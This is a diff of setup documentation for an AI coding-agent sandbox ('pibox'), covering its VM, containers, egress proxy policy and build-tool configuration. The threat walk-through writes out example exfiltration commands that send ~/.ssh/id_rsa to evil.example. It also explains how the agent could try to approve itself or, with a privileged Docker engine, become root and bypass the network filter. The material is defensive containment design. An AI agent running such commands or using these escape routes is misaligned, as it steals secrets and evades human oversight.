-1. points apt at `APT_UBUNTU` and at `UPSTREAM_PROXY`, if they are set, and installs `PI_APT_PACKAGES`;
-2. downloads Node.js from `NODE_DIST`, checks it against the published checksum, and unpacks it to
+1. points apt at `repository.apt_ubuntu` and at `network.upstream_proxy`, if they are set, and installs `pi.apt_packages`;
+2. downloads Node.js from `repository.node_dist`, checks it against the published checksum, and unpacks it to
    `/usr/local` (Ubuntu's own `nodejs` package is too old for Pi);
-3. installs Pi from `NPM_REGISTRY`;
+3. installs Pi from `repository.npm`;
 4. creates an **unprivileged** user `agent` to run Pi, because the VM's default user has passwordless
    `sudo`. `agent` joins your user's group, so it can use the shared folders, which appear in the VM
-   at the same paths as on the Mac, owned by your Mac's numeric user ID. `.env` is `chmod 600`, so
-   `agent` can't read it through the read-only mount;
+   at the same paths as on the Mac, owned by your Mac's numeric user ID. `config.yaml` and the generated
+   `.env` files are `chmod 600`, so `agent` can't read them through the read-only mount;
 5. copies Pi's configuration into `/home/agent/.pi/agent`: the model list with the bridge at
-   `host.lima.internal:BRIDGE_PORT` (inside the VM that name leads to the Mac's `127.0.0.1`, §4.4),
+   `host.lima.internal:<network.bridge_port>` (inside the VM that name leads to the Mac's `127.0.0.1`, §4.4),
    `settings.json` and the extensions. They belong to `agent`, who could edit them: in Option B they
    are a convenience, not protection.
 
-Run it again after changing `.env`.
+Run it again after changing `config.yaml`.
 
 ### 8.3 Run
 
-With `pi-sandbox bridge` running on the Mac:
+With `pibox bridge` running on the Mac:
 
 ```bash
-cd ~/Projects/api && pi-sandbox vm-run
+cd ~/Projects/api && pibox vm-run
 ```
 
 Pi starts as `agent` inside the VM, in the same folder.
 
 **Limit:** the VM can reach the internet and your LAN freely. A firewall inside the VM doesn't help,
 because anything with root in the VM can turn it off. That's what Option C solves. `.obsidian`,
-hooks and git config aren't write-protected here either, so run `pi-sandbox review` (§6.7) after each session.
+hooks and git config aren't write-protected here either, so run `pibox review` (§6.7) after each session.
 
 ---
 
@@ -1449,13 +1571,13 @@ hooks and git config aren't write-protected here either, so run `pi-sandbox revi
 ```
  Mac host                       Colima VM (vz; mounts: Projects, vault rw; ~/.pi-sandbox ro)
  ─────────                      ──────────────────────────────────────────────────────────
- terminal 1 ── pi-sandbox run ───────────▶ ┌──────────┐  network "sandbox" (internal: no internet)
+ terminal 1 ── pibox run ───────────▶ ┌──────────┐  network "sandbox" (internal: no internet)
                                            │   pi     │──────┬───────────────┐
                                            └──────────┘      │               │
                                      Projects + vault        ▼               ▼
                                      (same paths as on    ┌────────┐     ┌─────────┐
                                       the Mac)            │ bridge │     │  proxy  │ mitmproxy:
- terminal 2 ── pi-sandbox approve ──────────────────────▶ │ key    │     │ GET/HEAD│ policy +
+ terminal 2 ── pibox approve ──────────────────────▶ │ key    │     │ GET/HEAD│ policy +
               (approve / kill each request)               └───┬────┘     └────┬────┘ approval
                                                               │ network "egress" │
                                                               ▼                  ▼
@@ -1469,34 +1591,34 @@ Three containers run inside the Colima VM, four with the agent's own Docker engi
 |---|---|---|
 | `pi` | `sandbox` only (internal) | Runs the agent and every command it starts. Sees your projects and the vault, nothing else |
 | `bridge` | `sandbox` + `egress` | The pi-text bridge. Holds the router key. The only way to the model |
-| `proxy` | `sandbox` + `egress` | mitmproxy with our policy. The only way to the web and to your artifact repository. Pauses requests for your approval, then passes them on to `UPSTREAM_PROXY` |
+| `proxy` | `sandbox` + `egress` | mitmproxy with our policy. The only way to the web and to your artifact repository. Pauses requests for your approval, then passes them on to `network.upstream_proxy` |
 | `docker` | `sandbox` only (internal) | The agent's own Docker engine (§9.10): the containers the agent starts (databases, services, Testcontainers) run here, with the same network limits |
 
 **Walk-through of what happens:**
 
-- *The agent runs `curl http://docs.python.org/3/`.* curl reads `http_proxy=http://proxy:8080` (`PROXY_PORT`) and
+- *The agent runs `curl http://docs.python.org/3/`.* curl reads `http_proxy=http://proxy:8080` (`network.proxy_port`) and
   sends the request to the proxy (the only host it can reach) as plain text:
   `GET http://docs.python.org/3/`. The policy sees `GET`, a public host and port 80, so it's allowed.
   It then **pauses** the request, and it appears in the approval console in your second terminal. You
-  press `a`; the proxy passes it to `UPSTREAM_PROXY` and returns the page to curl.
+  press `a`; the proxy passes it to `network.upstream_proxy` and returns the page to curl.
 - *The agent runs `curl https://docs.python.org/3/`.* For an `https://` URL curl asks the proxy for an
   encrypted tunnel (`CONNECT docs.python.org:443`). Nobody could see the method inside it, so the
   policy refuses it with a message telling the agent to use `http://` URLs (§4.6).
-- *The agent runs `npm install`.* npm asks `NPM_REGISTRY` (your mirror's `http://` address), through
-  the same proxy. The mirror is listed in `EGRESS_ALLOW_PRIVATE` (it's on an internal address) and in
-  `EGRESS_NO_APPROVAL`, so the downloads pass without hundreds of prompts. They are still GET-only.
+- *The agent runs `npm install`.* npm asks `repository.npm` (your mirror's `http://` address), through
+  the same proxy. The mirror is listed in `egress.allow_private` (it's on an internal address) and in
+  `egress.no_approval`, so the downloads pass without hundreds of prompts. They are still GET-only.
 - *The agent runs `curl -X POST -d @~/.ssh/id_rsa http://evil.example`.* The file doesn't exist in
   the container, and even if it did, the proxy answers `405 method not allowed` at once. The
   request never leaves the proxy, and never reaches your approval queue.
 - *The agent runs `curl --noproxy '*' http://evil.example`.* DNS fails and there's no route: the
   `sandbox` network has no gateway (§4.5).
 - *The agent tries `http://192.168.1.1` (your router) or an intranet host.* The proxy refuses private
-  addresses, except the hosts you listed in `EGRESS_ALLOW_PRIVATE`.
+  addresses, except the hosts you listed in `egress.allow_private`.
 - *The agent tries to "approve itself".* The approval UI is a console in your terminal, attached
-  with `pi-sandbox approve` (`docker attach`). It has no network port the agent could talk to.
+  with `pibox approve` (`docker attach`). It has no network port the agent could talk to.
 - *The agent edits `<vault>/.obsidian/plugins/…`.* That folder is mounted read-only: `Read-only file system`.
 - *The agent runs `mvn verify` in a Spring Boot project.* Maven reads the generated `settings.xml`
-  (§9.9): every repository is replaced by `MAVEN_REPO_URL`, with your read-only token, through the
+  (§9.9): every repository is replaced by `repository.maven`, with your read-only token, through the
   proxy. The integration tests start PostgreSQL with Testcontainers: the image comes from your
   registry through the agent's Docker engine, the database listens on `docker:<port>`, and the tests
   connect to it there.
@@ -1524,11 +1646,11 @@ where they are (keep any other keys if `~/.docker/config.json` already exists):
 
 Check: `docker compose version` and `docker buildx version`.
 
-**Create the VM** from `.env` (§8.1 shows the generated `colima.yaml`):
+**Create the VM** from `config.yaml` (§8.1 shows the generated `colima.yaml`):
 
 ```bash
-pi-sandbox vm
-docker --context colima-pi info --format '{{.Name}}'     # the VM's Docker answers (context colima-<VM_PROFILE>)
+pibox vm
+docker --context colima-pi info --format '{{.Name}}'     # the VM's Docker answers (context colima-<vm.profile>)
 ```
 
 Why each mount:
@@ -1539,15 +1661,15 @@ Why each mount:
   means nothing in the VM can change them. The `pi` container gets only the specific files it needs;
 - **nothing else:** your home directory is not shared at all.
 
-`pi-sandbox` always talks to this VM's Docker (`DOCKER_CONTEXT=colima-<VM_PROFILE>`), whatever your
+`pibox` always talks to this VM's Docker (`colima-<vm.profile>`, or `$DOCKER_CONTEXT` if you set it), whatever your
 default Docker context is.
 
-**For the agent's Docker engine** (`AGENT_DOCKER=sysbox`, §9.10), install the sysbox runtime into the
+**For the agent's Docker engine** (`agent_docker.mode: sysbox`, §9.10), install the sysbox runtime into the
 VM once. Put the sysbox-ce `.deb` for the VM's architecture (Apple Silicon: arm64) on your mirror,
-set `SYSBOX_DEB_URL`, then:
+set `agent_docker.sysbox_deb_url`, then:
 
 ```bash
-pi-sandbox vm-sysbox        # ends with "sysbox-runc is available"
+pibox vm-sysbox        # ends with "sysbox-runc is available"
 ```
 
 ### 9.3 Files you'll create
@@ -1556,8 +1678,9 @@ All of them live in `~/.pi-sandbox` (§6.3), never under `~/Projects`, and none 
 
 ```
 ~/.pi-sandbox/
-├── .env                       # §6.3: all settings, including the router key for the bridge
-├── pi-sandbox                 # §6.4
+├── config.yaml                # §6.3: all settings, including the router key for the bridge
+├── .env                       # generated by pibox for docker compose
+├── pibox                      # §6.4
 ├── compose.yaml               # §9.8
 ├── Dockerfile.pi              # §9.4
 ├── Dockerfile.bridge          # §9.5
@@ -1565,18 +1688,18 @@ All of them live in `~/.pi-sandbox` (§6.3), never under `~/Projects`, and none 
 ├── generated/c/               # §9.9: generated settings.xml, init.gradle, npmrc, pip.conf, Docker configs
 ├── pi-text/                   # the bridge's source (§6.3: the git clone)
 ├── agent/
-│   ├── models.compose.json    # §9.7: generated, baseUrl http://bridge:BRIDGE_PORT/v1
+│   ├── models.compose.json    # §9.7: generated, baseUrl http://bridge:<network.bridge_port>/v1
 │   └── settings.json          # §6.6
 └── extensions/                # sandbox-guard.ts, web.ts from §12
 ```
 
 To add a service (for example SearXNG for `web_search`) or override something without touching
-`compose.yaml`, create `compose.override.yaml`: `pi-sandbox` adds it automatically.
+`compose.yaml`, create `compose.override.yaml`: `pibox` adds it automatically.
 
 ### 9.4 `Dockerfile.pi`: the agent's image
 
 ```dockerfile
-# The agent's image: Pi plus a development toolchain. Every image name comes from .env, so all of
+# The agent's image: Pi plus a development toolchain. Every image name comes from config.yaml, so all of
 # them can be pulled through your registry mirror.
 ARG NODE_IMAGE=node:24-bookworm-slim
 ARG JDK17_IMAGE=eclipse-temurin:17-jdk
@@ -1645,20 +1768,20 @@ ENTRYPOINT ["pi"]
 Step by step:
 - **The `FROM … AS jdk17` lines** name the official images that contribute tools: Eclipse Temurin
   JDK 17, 21 and 25, Maven, Gradle, and the Docker CLI with its `compose` and `buildx` plugins. All
-  names come from `.env`, so they are pulled through your registry like any other image, and no
+  names come from `config.yaml`, so they are pulled through your registry like any other image, and no
   separate download source is needed. The `COPY --from=…` lines later take just the tool folders out of them.
 - **`FROM ${NODE_IMAGE}`**: the base is Node.js 24 on Debian (Pi needs Node).
-- **`APT_DEBIAN`/`APT_SECURITY`:** if set, `sed` replaces the two official server addresses in
+- **`repository.apt_debian`/`repository.apt_security`:** if set, `sed` replaces the two official server addresses in
   Debian's source list with your mirrors. The patterns match whole lines, so nothing else changes.
 - **`apt-get install $PI_APT_PACKAGES`**: the system tools the agent may use: git, ripgrep, curl,
   `jq` and HTTPie for API calls, a C compiler (`build-essential`, for native npm and pip packages),
   Python 3 with venv and pip. **Bake everything it needs into the image** by adding packages to
-  `PI_APT_PACKAGES`: at run time it has no root and no direct internet, so it can't install system packages.
-- **JDKs in `/opt/jdk/17`, `/opt/jdk/21`, `/opt/jdk/25`**; `JAVA_DEFAULT` (21) is `JAVA_HOME` and on
+  `pi.apt_packages`: at run time it has no root and no direct internet, so it can't install system packages.
+- **JDKs in `/opt/jdk/17`, `/opt/jdk/21`, `/opt/jdk/25`**; `pi.java_default` (21) is `JAVA_HOME` and on
   `PATH`. `JAVA_HOME_17` etc. point at the others, the small `jdk` command runs one command with
   another JDK (`jdk 17 mvn test`), and Maven and Gradle toolchains find all three (§9.9).
 - **Maven in `/opt/maven`, Gradle in `/opt/gradle`, `docker` with `docker compose` and `docker buildx`.**
-- `npm install -g … pi-coding-agent`: Pi itself, from `NPM_REGISTRY` (`--ignore-scripts` skips install
+- `npm install -g … pi-coding-agent`: Pi itself, from `repository.npm` (`--ignore-scripts` skips install
   scripts of dependencies). `corepack enable` provides `pnpm` and `yarn`.
 - **The user.** The image's own `node` user is removed, and a user `pi` is created with **your Mac's
   numeric IDs**, so files the agent writes into your folders belong to you. (Java looks up the home
@@ -1670,7 +1793,7 @@ Step by step:
 - `ENV HOME=… PI_OFFLINE=1 …`: a fixed home directory, and no network calls by Pi itself (§6.6).
 
 The proxy variables used while building (`HTTP_PROXY` and friends) are passed by Compose from
-`UPSTREAM_PROXY` (§9.8). Docker uses them only for the build and doesn't store them in the image.
+`network.upstream_proxy` (§9.8). Docker uses them only for the build and doesn't store them in the image.
 The image is large (about 3 GB with three JDKs); it is built once and then reused.
 
 ### 9.5 `Dockerfile.bridge`: the bridge
@@ -1693,15 +1816,16 @@ CMD ["sh", "-c", "exec uvicorn proxy:app --host 0.0.0.0 --port \"${BRIDGE_PORT:-
 - The bridge listens on `0.0.0.0` **inside its container**. That's reachable only from the two
   Compose networks. No port is published to the Mac.
 
-The bridge's settings (`PI_TEXT_URL`, `PI_TEXT_KEY`, `TRACE`, `BRIDGE_PORT`, …) come from `.env`
-through `env_file` in `compose.yaml`: only the bridge container receives them. If the router must be
-reached directly while other traffic uses `UPSTREAM_PROXY`, add the router's host to `UPSTREAM_NO_PROXY`.
+The bridge's settings (the `bridge` section of `config.yaml`, plus `network.bridge_port`) come from
+`generated/bridge.env` through `env_file` in `compose.yaml`: only the bridge container receives them.
+If the router must be reached directly while other traffic uses `network.upstream_proxy`, add the
+router's host to `network.upstream_no_proxy`.
 
 ### 9.6 `addons/egress_policy.py`: the web policy
 
 mitmproxy calls functions in an addon at specific moments ("hooks"). Ours decides, for every
 request, whether it may go out, asks you when needed, and writes a journal. Forwarding to
-`UPSTREAM_PROXY` is mitmproxy's own `--mode upstream` (§9.8):
+`network.upstream_proxy` is mitmproxy's own `--mode upstream` (§9.8):
 
 ```python
 """Egress policy for the agent sandbox (mitmproxy addon).
@@ -1847,7 +1971,7 @@ The hooks, in the order mitmproxy calls them:
 | Hook | When | What we do |
 |---|---|---|
 | `http_connect` | The client asks for an encrypted tunnel (`CONNECT host:443`) | Always refused: the method inside a tunnel can't be seen |
-| `requestheaders` | A plain HTTP request's headers have arrived | Method is GET/HEAD; no body; no `Upgrade` (WebSockets); port, deny list, allowlist, private address. Then pause the request for approval unless the host is in `EGRESS_NO_APPROVAL` |
+| `requestheaders` | A plain HTTP request's headers have arrived | Method is GET/HEAD; no body; no `Upgrade` (WebSockets); port, deny list, allowlist, private address. Then pause the request for approval unless the host is in `egress.no_approval` |
 | `response` / `error` | The answer arrived, or the request failed | Journal entry |
 | `tcp_start` / `udp_start` | Something that isn't HTTP tries to use the tunnel (for example SSH over port 443) | Always killed |
 
@@ -1862,42 +1986,45 @@ Details that matter:
   and the full URL are visible as they are. `connection_strategy=lazy` (in `compose.yaml`) means the
   proxy opens no connection onwards before the policy has looked at the request.
 - **Private addresses** are found by resolving the name. A host that can't be resolved inside the VM
-  is allowed to go on (only the upstream proxy could reach it). If you use `UPSTREAM_PROXY`, add your
-  internal domain to `EGRESS_DENY` so the agent can't reach intranet sites through it.
+  is allowed to go on (only the upstream proxy could reach it). If you use `network.upstream_proxy`, add your
+  internal domain to `egress.deny` so the agent can't reach intranet sites through it.
 - **The journal** (`egress.log`) records every decision with a time stamp:
   `docker compose exec proxy tail -f /home/mitmproxy/.mitmproxy/egress.log`.
 
-The settings, all from `.env`:
-- `EGRESS_ALLOW_PRIVATE`: hosts on internal addresses that are still allowed, typically your package mirror;
-- `EGRESS_NO_APPROVAL`: hosts that don't wait for you: package registries. GET-only still applies;
-- `EGRESS_ALLOW_ONLY`: only these domains and their subdomains. Use it for unattended runs, where
+The settings, the `egress` section of `config.yaml` (the addon reads them as `EGRESS_*` variables):
+- `egress.allow_private`: hosts on internal addresses that are still allowed, typically your package mirror;
+- `egress.no_approval`: hosts that don't wait for you: package registries. GET-only still applies;
+- `egress.allow_only`: only these domains and their subdomains. Use it for unattended runs, where
   you won't be approving requests;
-- `EGRESS_DENY`: always refused, for example paste and file-sharing sites;
-- `EGRESS_PORTS`: allowed ports, `80,443` by default (add your mirror's port if it isn't 443).
+- `egress.deny`: always refused, for example paste and file-sharing sites;
+- `egress.ports`: allowed ports, `80,443` by default (add your mirror's port if it isn't 443).
 
 ### 9.7 `agent/models.compose.json`: Pi's view of the model
 
-`pi-sandbox up` and `pi-sandbox run` generate it from `MODEL_*`. For `MODEL_ID=YOUR_MODEL_ID` it reads:
+`pibox up` and `pibox run` generate it from `models` in `config.yaml`. For the example of §6.3 with
+the second model uncommented it reads:
 
 ```json
 {
   "providers": {
-    "text-tools": {
+    "pi-sandbox": {
       "baseUrl": "http://bridge:8789/v1", "api": "openai-completions", "apiKey": "unused",
-      "apiKey": "unused",
       "compat": { "supportsDeveloperRole": false, "supportsStore": false,
                   "supportsReasoningEffort": false, "supportsUsageInStreaming": true },
       "models": [
-        { "id": "EXACT-MODEL-ID-OF-THE-ROUTER", "name": "Router model (sandbox)", "reasoning": false,
-          "input": ["text"], "contextWindow": 32768, "maxTokens": 8192,
-          "cost": { "input": 0, "output": 0, "cacheRead": 0, "cacheWrite": 0 } }
+        { "id": "YOUR_MODEL_ID", "name": "YOUR_MODEL_ID (sandbox)", "reasoning": false,
+          "input": ["text"], "cost": { "input": 0, "output": 0, "cacheRead": 0, "cacheWrite": 0 },
+          "contextWindow": 32768, "maxTokens": 8192 },
+        { "id": "YOUR_REASONING_MODEL_ID", "name": "YOUR_REASONING_MODEL_ID (sandbox)", "reasoning": true,
+          "input": ["text"], "cost": { "input": 0, "output": 0, "cacheRead": 0, "cacheWrite": 0 },
+          "contextWindow": 131072, "maxTokens": 32768, "compat": { "supportsReasoningEffort": true } }
       ]
     }
   }
 }
 ```
 
-Same format as in the main README, except for one detail: `baseUrl` is `http://bridge:<BRIDGE_PORT>/v1`.
+Same format as in the main README, except for one detail: `baseUrl` is `http://bridge:<network.bridge_port>/v1`.
 Inside the Compose networks, `bridge` is the bridge container's DNS name. `settings.json` is the one
 from §6.6, and the extensions from §12 go into `~/.pi-sandbox/extensions/`.
 
@@ -1905,8 +2032,8 @@ from §6.6, and the extensions from §12 go into `~/.pi-sandbox/extensions/`.
 
 ```yaml
 name: pi-sandbox
-# All settings come from .env next to this file (§6.3). Start it with the pi-sandbox command, which
-# also writes the generated/ files mounted below. To add services or change one without editing
+# All settings come from .env next to this file, which pibox generates from config.yaml (§6.3).
+# Start it with the pibox command, which also writes the generated/ files used below. To add services or change one without editing
 # this file, use compose.override.yaml.
 
 x-build-proxy: &build-proxy           # only for downloads while images are built
@@ -1942,7 +2069,7 @@ services:
         <<: *build-proxy
         PYTHON_IMAGE: ${PYTHON_IMAGE:-python:3.12-slim}
         PIP_INDEX_URL: ${PIP_INDEX_URL:-https://pypi.org/simple}
-    env_file: .env                           # PI_TEXT_URL, PI_TEXT_KEY, BRIDGE_PORT, TRACE, ...
+    env_file: generated/bridge.env           # the bridge section of config.yaml, and BRIDGE_PORT
     environment:
       HTTP_PROXY: ${UPSTREAM_PROXY:-}        # empty = direct
       HTTPS_PROXY: ${UPSTREAM_PROXY:-}
@@ -1990,7 +2117,7 @@ services:
     security_opt: ["no-new-privileges:true"]
     restart: unless-stopped
 
-  docker:                                    # the agent's own Docker engine (AGENT_DOCKER in .env)
+  docker:                                    # the agent's own Docker engine (agent_docker.mode)
     image: ${DIND_IMAGE:-docker:29-dind}
     profiles: [docker]
     runtime: ${DIND_RUNTIME:-sysbox-runc}    # sysbox: nested containers without a privileged container
@@ -2034,7 +2161,7 @@ services:
     networks: [sandbox]                      # ONLY the internal network
     stdin_open: true
     tty: true
-    working_dir: ${PROJECTS_DIR:?set PROJECTS_DIR in .env}
+    working_dir: ${PROJECTS_DIR:?run pibox, it generates .env from config.yaml}
     environment:
       http_proxy: http://proxy:${PROXY_PORT:-8080}
       HTTP_PROXY: http://proxy:${PROXY_PORT:-8080}
@@ -2043,7 +2170,7 @@ services:
       no_proxy: bridge,docker,localhost,127.0.0.1
       NO_PROXY: bridge,docker,localhost,127.0.0.1
       NODE_USE_ENV_PROXY: "1"                # Node >= 24: fetch() in agent scripts honours the proxy vars
-      # Package managers: their configuration is generated from .env into generated/c (§9.9)
+      # Package managers: their configuration is generated from config.yaml into generated/c (§9.9)
       NPM_CONFIG_USERCONFIG: /home/pi/.config/pi-sandbox/npmrc
       PIP_CONFIG_FILE: /home/pi/.config/pi-sandbox/pip.conf
       COREPACK_NPM_REGISTRY: ${NPM_REGISTRY:-https://registry.npmjs.org/}
@@ -2057,7 +2184,7 @@ services:
       WEB_SEARCH_SEARXNG: ${WEB_SEARCH_SEARXNG:-}
       WEB_FETCH_MAX_CHARS: ${WEB_FETCH_MAX_CHARS:-20000}
       # Folders the file tools may touch (sandbox-guard.ts):
-      PI_SANDBOX_ROOTS: ${PROJECTS_DIR}:${VAULT_DIR:?set VAULT_DIR in .env}
+      PI_SANDBOX_ROOTS: ${PROJECTS_DIR}:${VAULT_DIR:?run pibox, it generates .env from config.yaml}
       PI_WEB_PROXY: http://proxy:${PROXY_PORT:-8080}
     volumes:
       # Same paths as on the Mac, so paths in notes, logs and Pi sessions mean the same everywhere.
@@ -2094,13 +2221,13 @@ Service by service:
 - **`x-build-proxy`**: a reusable block (YAML anchor) with the proxy variables for image builds.
   Empty values mean "no proxy".
 - **`networks`**: `sandbox` is `internal: true`, so it has no route out (§4.5). `egress` is a normal network with internet access.
-- **`bridge`**: on both networks. It uses `UPSTREAM_PROXY` for the router unless the router is in
-  `UPSTREAM_NO_PROXY`. `read_only`, `cap_drop: [ALL]` (no special kernel privileges) and
+- **`bridge`**: on both networks. It uses `network.upstream_proxy` for the router unless the router is in
+  `network.upstream_no_proxy`. `read_only`, `cap_drop: [ALL]` (no special kernel privileges) and
   `no-new-privileges` (setuid binaries can't elevate) are standard container hardening.
 - **`proxy`**:
   - `command` starts the mitmproxy **console** with our addon. `connection_strategy=lazy` means it
     doesn't connect onwards before the request is checked.
-  - `$${UPSTREAM_PROXY:+--mode upstream:$$UPSTREAM_PROXY}`: if `UPSTREAM_PROXY` is set, the shell adds
+  - `$${UPSTREAM_PROXY:+--mode upstream:$$UPSTREAM_PROXY}`: if `network.upstream_proxy` is set, the shell adds
     `--mode upstream:<proxy>`, and mitmproxy passes every allowed request to that proxy. Empty: it
     connects directly. (`$$` is how Compose writes a literal `$` for the shell inside the container.)
   - `stty cols 160 rows 48` gives the console a terminal size before you attach. Without it the
@@ -2110,9 +2237,9 @@ Service by service:
   - `stdin_open` + `tty`: the console is interactive and you reach it with `docker attach`.
   - `stream_large_bodies=1m`: large downloads (image layers, archives) stream through instead of
     being held in memory.
-  - A fixed address on the internal network (`SANDBOX_PROXY_IP`, the `.10` of `SANDBOX_SUBNET`):
+  - A fixed address on the internal network (`SANDBOX_PROXY_IP`, the `.10` of `network.sandbox_subnet`):
     containers inside the agent's Docker engine can't resolve the name `proxy`, so they use the address.
-- **`docker`**: the agent's Docker engine, started only when `AGENT_DOCKER` isn't `off` (a Compose
+- **`docker`**: the agent's Docker engine, started only when `agent_docker.mode` isn't `off` (a Compose
   *profile*). §9.10 explains it.
 - **`pi`**:
   - `networks: [sandbox]` only: everything else follows from this line.
@@ -2120,12 +2247,12 @@ Service by service:
     `NODE_USE_ENV_PROXY=1` makes Node scripts use the proxy too.
   - `NPM_CONFIG_USERCONFIG`, `PIP_CONFIG_FILE`, `MVNW_REPOURL`, `COREPACK_NPM_REGISTRY`: npm, pip, the
     Maven wrapper and corepack use your repository (§9.9).
-  - `DOCKER_HOST=tcp://docker:2375` (empty with `AGENT_DOCKER=off`) and
+  - `DOCKER_HOST=tcp://docker:2375` (empty with `agent_docker.mode: off`) and
     `TESTCONTAINERS_HUB_IMAGE_NAME_PREFIX`: the `docker` CLI, Docker Compose and Testcontainers use the
     agent's engine, and Testcontainers takes Docker Hub images from your registry.
   - `PI_WEB_PLAIN_HTTP=1`: `web_fetch` sends `https://` pages as plain `http://` requests (§12.3).
   - `volumes`:
-    - `PROJECTS_DIR` and `VAULT_DIR`, writable, **at the same paths as on the Mac**;
+    - `folders.projects` and `folders.vault`, writable, **at the same paths as on the Mac**;
     - `.obsidian` mounted again on top, read-only: the agent can write notes but not Obsidian's
       settings or plugins;
     - Pi's state (`pi-home`, a Docker volume inside the VM);
@@ -2141,18 +2268,18 @@ root on the VM. The agent gets its own engine instead (§9.10).
 
 ### 9.9 Build tools and your artifact repository
 
-**What:** `pi-sandbox up` and `pi-sandbox run` write these files into `~/.pi-sandbox/generated/c`
-from `.env`, and `compose.yaml` mounts them read-only where each tool looks for its settings:
+**What:** `pibox up` and `pibox run` write these files into `~/.pi-sandbox/generated/c`
+from `config.yaml`, and `compose.yaml` mounts them read-only where each tool looks for its settings:
 
 | Generated file | Mounted as | What it sets |
 |---|---|---|
-| `settings.xml` | `~/.m2/settings.xml` | One mirror (`mirrorOf *`) = `MAVEN_REPO_URL`, the credentials for it, the filtering proxy |
+| `settings.xml` | `~/.m2/settings.xml` | One mirror (`mirrorOf *`) = `repository.maven`, the credentials for it, the filtering proxy |
 | `toolchains.xml` | `~/.m2/toolchains.xml` | JDK 17, 21 and 25 for projects that use Maven toolchains |
 | `gradle.properties` | `~/.gradle/gradle.properties` | The proxy for Gradle; the JDKs for Gradle toolchains, no JDK downloads |
 | `init.gradle` | `~/.gradle/init.d/pi-sandbox.gradle` | Replaces every remote repository of a build (plugins, buildscript, settings, projects) by your mirror |
 | `npmrc` | `NPM_CONFIG_USERCONFIG` | Registry, credentials (`_auth`), proxy; no audit, no update checks |
 | `pip.conf` | `PIP_CONFIG_FILE` | Index with credentials, trusted host, proxy |
-| `docker-config.json` | `~/.docker/config.json` | Login for `DOCKER_REGISTRY`; the proxy that `docker run`, `docker compose` and `docker build` give to the containers they start |
+| `docker-config.json` | `~/.docker/config.json` | Login for `repository.docker_registry`; the proxy that `docker run`, `docker compose` and `docker build` give to the containers they start |
 | `daemon.json` | `/etc/docker/daemon.json` of the `docker` service | The agent's engine: your registry over HTTP, the Docker Hub mirror, the proxy, the address pool (§9.10) |
 
 **Why:** the agent has no route to Maven Central, npmjs.com, PyPI or Docker Hub, and HTTPS tunnels
@@ -2170,14 +2297,14 @@ lists five repositories still resolves everything from the one mirror.
   Gradle **wrapper** is the one exception: `./gradlew` downloads its distribution from the URL in
   `gradle/wrapper/gradle-wrapper.properties`, usually `https://services.gradle.org`, which the
   sandbox can't reach. Use the installed `gradle`, or point `distributionUrl` at your repository's copy.
-- **npm, pnpm, yarn**: `.npmrc` for npm; corepack downloads pnpm and yarn from `NPM_REGISTRY`.
+- **npm, pnpm, yarn**: `.npmrc` for npm; corepack downloads pnpm and yarn from `repository.npm`.
 - **pip**: `pip.conf`, inside virtual environments too.
-- **Credentials**: `ARTIFACTORY_USER` and `ARTIFACTORY_TOKEN` go into these files, so the agent can
+- **Credentials**: `repository.user` and `repository.token` go into these files, so the agent can
   read them. Use a token that can only read.
-- **Your repository must be reachable through the proxy**: put its host into `EGRESS_ALLOW_PRIVATE`
-  (it has an internal address) and `EGRESS_NO_APPROVAL` (no prompt per download), into
-  `UPSTREAM_NO_PROXY` if it is reached directly rather than through `UPSTREAM_PROXY`, and its ports
-  into `EGRESS_PORTS` if they aren't 80/443.
+- **Your repository must be reachable through the proxy**: put its host into `egress.allow_private`
+  (it has an internal address) and `egress.no_approval` (no prompt per download), into
+  `network.upstream_no_proxy` if it is reached directly rather than through `network.upstream_proxy`, and its ports
+  into `egress.ports` if they aren't 80/443.
 - **Deploy, publish, push** (POST/PUT) are refused by the proxy: the agent builds and tests, you publish.
 
 ### 9.10 The agent's Docker engine
@@ -2192,57 +2319,57 @@ could start a container with your folders, on any network, as root. Its own engi
 
 - its containers have no route out; `docker run`, `docker compose` and `docker build` give them the
   filtering proxy (`docker-config.json`), so they can GET from the web and your repository, nothing more;
-- images come from `DOCKER_REGISTRY` and, for Docker Hub names like `postgres:16`, from
-  `DOCKER_REGISTRY_MIRROR`, over plain HTTP through the proxy. Pulls are GET requests; pushes are refused;
+- images come from `repository.docker_registry` and, for Docker Hub names like `postgres:16`, from
+  `repository.docker_mirror`, over plain HTTP through the proxy. Pulls are GET requests; pushes are refused;
 - ports a container publishes (`-p 5432:5432`) are reachable from the `pi` container at
   `docker:5432`, not at `localhost`. Testcontainers knows this from `DOCKER_HOST` and returns
   `docker` as the host by itself.
 
-**`AGENT_DOCKER`: how well the engine is isolated.**
+**`agent_docker.mode`: how well the engine is isolated.**
 
 | Value | How the engine runs | What it means |
 |---|---|---|
-| `sysbox` (default) | Under the [sysbox](https://github.com/nestybox/sysbox) runtime, not privileged | Containers inside are isolated with user namespaces; a container started by the agent can't take over the VM. Needs `pi-sandbox vm-sysbox` once (§9.2) |
+| `sysbox` (default) | Under the [sysbox](https://github.com/nestybox/sysbox) runtime, not privileged | Containers inside are isolated with user namespaces; a container started by the agent can't take over the VM. Needs `pibox vm-sysbox` once (§9.2) |
 | `privileged` | As a privileged container, the usual way to run Docker in Docker | Works everywhere. But the agent controls a privileged engine: it can start a privileged container and become **root in the VM**, then read the bridge's key, reach the network directly and read `~/.pi-sandbox`. The VM still protects the Mac, so this is roughly Option B with the build tools |
 | `off` | No engine | The agent builds and tests, but can't start containers (no Testcontainers, no `docker compose`) |
 
 **Details:**
 - `daemon.json` declares your registry *insecure* (plain HTTP, which the proxy can check), the
-  mirror, the proxy, and an address pool for the engine's networks (`DIND_ADDRESS_POOL`). It turns
+  mirror, the proxy, and an address pool for the engine's networks (`agent_docker.address_pool`). It turns
   off the containerd image store: with it, Docker 29 tries HTTPS first for an HTTP registry and
   doesn't fall back when the proxy refuses the tunnel.
 - `DOCKER_MIN_API_VERSION=1.24` keeps older clients working: Testcontainers 1.x speaks API 1.32,
   which Docker 29 otherwise rejects.
-- `DOCKER_IMAGE_PREFIX` goes before Docker Hub names in Testcontainers (`postgres:16` becomes
+- `repository.docker_image_prefix` goes before Docker Hub names in Testcontainers (`postgres:16` becomes
   `<prefix>postgres:16`); the Ryuk helper image is taken from there too. With the Docker Hub mirror
   set, you can leave the prefix empty.
 - Images and stopped containers stay in the `docker-data` volume between runs. `docker system prune`
   inside the sandbox frees space.
-- `SANDBOX_SUBNET` and `DIND_ADDRESS_POOL` are private address ranges. Change them if they overlap
+- `network.sandbox_subnet` and `agent_docker.address_pool` are private address ranges. Change them if they overlap
   with networks in your company that the proxy or the bridge must reach.
 
 ### 9.11 Daily use
 
